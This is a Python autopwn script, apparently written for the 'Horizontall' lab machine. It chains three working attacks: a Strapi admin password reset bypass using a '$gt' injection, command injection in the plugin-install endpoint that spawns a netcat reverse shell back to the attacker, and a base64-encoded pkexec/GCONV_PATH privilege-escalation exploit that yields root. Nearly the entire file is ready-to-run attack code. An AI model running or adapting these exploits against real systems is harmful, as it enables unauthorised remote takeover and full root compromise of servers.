import requests, json
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Horizontall ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

os.system("echo '10.10.11.105 api-prod.horizontall.htb' >> /etc/hosts")

ip = sys.argv[1]
params = {"code" : {"$gt":0}, "password" : "SuperStrongPassword1", "passwordConfirmation" : "SuperStrongPassword1"}
output = requests.post(f"http://api-prod.horizontall.htb/admin/auth/reset-password", json = params).text
response = json.loads(output)
jwt = response["jwt"]
target = "http://api-prod.horizontall.htb/admin/plugins/install"

def cmd():
    time.sleep(1)
    headers = {'Host': "api-prod.horizontall.htb", 'Authorization': 'Bearer '+jwt, 'Content-Type': 'application/json', 'Content-Length': '131', 'Connection': 'close'}
    data = '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '
    extra = ' 443 >/tmp/f)", "port":"80"}'
    requests.post(target, headers=headers, data=data + ip + extra, verify=False)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=25).wait_for_connection()
shell.sendline(b"export TERM=xterm")
time.sleep(0.5)
payload = (b"aW1wb3J0IGJhc2U2NCxvcyxzeXMKZnJvbSBjdHlwZXMgaW1wb3J0ICoKZnJvbSBjdHlwZXMudXRp\nbCBpbXBvcnQgZmluZF9saWJyYXJ5CgpwYXlsb2FkX2I2NCA9IGIiZjBWTVJnSUJBUUFBQUFBQUFB\nQUFBQU1BUGdBQkFBQUFrZ0VBQUFBQUFBQkFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBRUFBT0FB\nQ1xuQUVBQUFnQUJBQUVBQUFBSEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXJ3\nRUFBQUFBQUFETUFRQUFBQUFBQUFBUVxuQUFBQUFBQUFBZ0FBQUFjQUFBQXdBUUFBQUFBQUFEQUJB\nQUFBQUFBQU1BRUFBQUFBQUFCZ0FBQUFBQUFBQUdBQUFBQUFBQUFBQUJBQVxuQUFBQUFBQUJBQUFB\nQmdBQUFBQUFBQUFBQUFBQU1BRUFBQUFBQUFBd0FRQUFBQUFBQUdBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFJQUFBQVxuQUFBQUFBY0FBQUFBQUFBQUFBQUFBQU1BQUFBQUFBQUFBQUFBQUpBQkFBQUFBQUFB\na0FFQUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQVxuQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF3\nQUFBQUFBQUFBa2dFQUFBQUFBQUFGQUFBQUFBQUFBSkFCQUFBQUFBQUFCZ0FBQUFBQVxuQUFDUUFR\nQUFBQUFBQUFvQUFBQUFBQUFBQUFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBQVxuQUFBQVNESC9hbWxZRHdWSXVDOWlhVzR2YzJnQW1WQlVYMUplYWp0WUR3\nVT0iCgpwYXlsb2FkID0gYmFzZTY0LmI2NGRlY29kZShwYXlsb2FkX2I2NCkKCmVudmlyb24gPSBb\nCiAgICAgICAgYidleHBsb2l0JywKICAgICAgICBiJ1BBVEg9R0NPTlZfUEFUSD0uJywKICAgICAg\nICBiJ0xDX01FU1NBR0VTPWVuX1VTLlVURi04JywKICAgICAgICBiJ1hBVVRIT1JJVFk9Li4vTE9M\nJywKICAgICAgICBOb25lCl0KCnRyeToKICAgIGxpYmMgPSBDRExMKGZpbmRfbGlicmFyeSgnYycp\nKQpleGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ3BheWxvYWQuc28n\nLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUocGF5bG9hZCkKZXhjZXB0OgogICAgc3lzLmV4\naXQoKQpvcy5jaG1vZCgncGF5bG9hZC5zbycsIDBvMDc1NSkKCnRyeToKICAgIG9zLm1rZGlyKCdH\nQ09OVl9QQVRIPS4nKQpleGNlcHQgRmlsZUV4aXN0c0Vycm9yOgogICAgcHJpbnQoJycpCmV4Y2Vw\ndDoKICAgIHN5cy5leGl0KCkKCnRyeToKICAgIHdpdGggb3BlbignR0NPTlZfUEFUSD0uL2V4cGxv\naXQnLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUoYicnKQpleGNlcHQ6CiAgICBzeXMuZXhp\ndCgpCm9zLmNobW9kKCdHQ09OVl9QQVRIPS4vZXhwbG9pdCcsIDBvMDc1NSkKCnRyeToKICAgIG9z\nLm1rZGlyKCdleHBsb2l0JykKZXhjZXB0IEZpbGVFeGlzdHNFcnJvcjoKICAgIHByaW50KCcnKQpl\neGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ2V4cGxvaXQvZ2NvbnYt\nbW9kdWxlcycsICd3YicpIGFzIGY6CiAgICAgICAgZi53cml0ZShiJ21vZHVsZSAgVVRGLTgvLyAg\nICBJTlRFUk5BTCAgICAuLi9wYXlsb2FkICAgIDJcbicpOwpleGNlcHQ6CiAgICBzeXMuZXhpdCgp\nCgplbnZpcm9uX3AgPSAoY19jaGFyX3AgKiBsZW4oZW52aXJvbikpKCkKZW52aXJvbl9wWzpdID0g\nZW52aXJvbgoKbGliYy5leGVjdmUoYicvdXNyL2Jpbi9wa2V4ZWMnLCBjX2NoYXJfcChOb25lKSwg\nZW52aXJvbl9wKQo=")
shell.sendline(b"echo '%s' | base64 -d > exploit.py" % (payload))
time.sleep(0.5)
shell.sendline(b"python3 exploit.py")
time.sleep(0.5)
shell.sendline(b"export HOME=/root TERM=xterm; cd; echo 'uid=0(root)'")
time.sleep(0.5)
shell.sendline(b"sudo su")
shell.interactive()